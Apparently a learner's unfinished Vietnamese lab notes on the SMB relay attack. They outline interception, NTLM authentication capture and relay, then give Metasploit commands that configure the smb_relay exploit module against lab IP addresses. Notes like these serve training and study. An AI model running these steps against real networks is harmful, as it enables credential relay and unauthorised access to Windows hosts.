# SMB Relay attack

Tấn công chuyển tiếp SMB

Cách tấn công:

- interception: có nhiều cách như ARP spoofing, DNS poisoning, hoặc tạo 1 SMB server giả

- capturing authentication: ghi lại xác thực khi người dùng connect, có thể là NTLM hash

- relay to a legitimate server: chuyển tiếp đến máy chủ thật

- có được truy cập 

### lab

Mở MSF

`search smb_relay`

`use exploit/windows/smb/smb_relay`

Mở 1 tab khác tìm `ifconfig` để biết IP của máy đang dùng

`set SRVHOST 172.16.5.101`

`set LHOST 172.16.5.101`

`set SMBHOST 172.16.5.10`

<chưa học xong>















